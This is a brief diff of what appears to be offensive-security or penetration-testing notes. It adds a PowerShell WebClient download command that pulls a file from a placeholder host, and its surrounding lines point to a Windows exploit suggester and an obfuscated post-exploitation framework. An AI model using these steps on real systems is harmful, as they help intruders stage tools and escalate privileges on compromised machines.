@@ -8,5 +8,7 @@ Set File Attributes (Linux):chattr {arg} {FilePath}
 
 systeminfo (Download output and run windows exploit suggestor)
 
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
 
 https://github.com/cobbr/ObfuscatedEmpire
